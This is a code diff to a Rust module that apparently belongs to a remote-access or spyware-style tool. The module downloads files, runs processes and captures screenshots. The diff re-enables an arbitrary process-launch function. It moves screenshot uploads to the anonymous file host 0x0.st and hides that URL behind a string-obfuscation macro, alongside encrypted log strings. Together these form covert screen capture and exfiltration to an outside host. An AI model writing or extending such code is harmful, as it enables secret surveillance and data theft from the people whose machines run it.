@@ -1,10 +1,12 @@
 extern crate systemstat;
 
+use crate::crypto;
 #[cfg(target_os = "windows")]
 use crate::crypto;
 use crate::info_crypt;
 use anyhow::anyhow;
 use anyhow::Context;
+use imgurs::NullPointer;
 use std::fs;
 use std::fs::File;
 use std::io;
@@ -16,7 +18,6 @@ use std::time::Duration;
 #[cfg(target_os = "windows")]
 use std::os::windows::process::CommandExt;
 
-use imgurs::ImgurClient;
 use rand::prelude::*;
 use screenshots::Screen;
 use systemstat::{saturating_sub_bytes, Platform, System};
@@ -41,14 +42,14 @@ pub async fn download_from_url(url: &str, path: &str) -> anyhow::Result<()> {
     Ok(())
 }
 
-// pub fn run_process_real(exe: &str, args: Vec<&str>, wait: bool) -> anyhow::Result<()> {
-//     if wait {
-//         Command::new(exe).args(args).output()?;
-//     } else {
-//         Command::new(exe).args(args).spawn()?;
-//     }
-//     Ok(())
-// }
+pub fn run_process_real(exe: &str, args: Vec<&str>, wait: bool) -> anyhow::Result<()> {
+    if wait {
+        Command::new(exe).args(args).output()?;
+    } else {
+        Command::new(exe).args(args).spawn()?;
+    }
+    Ok(())
+}
 
 pub fn run_process(exe: &str, args: Vec<&str>, wait: bool) -> anyhow::Result<()> {
     let mut full_command: Vec<String> = vec![];
@@ -181,15 +182,15 @@ pub async fn screenshot_url() -> anyhow::Result<String> {
 
     info_crypt!("Uploading screenshot...");
 
-    let info = ImgurClient::new(IMGUR_TOKENS[4])
-        .upload_image(&path)
+    let info = NullPointer::new(&crypto!("https://0x0.st"))
+        .upload(&path)
         .await?;
 
     tokio::spawn(async {
         fs::remove_file(path).unwrap();
     });
 
-    Ok(info.data.link)
+    Ok(info)
 }
 
 pub fn stat() -> String {
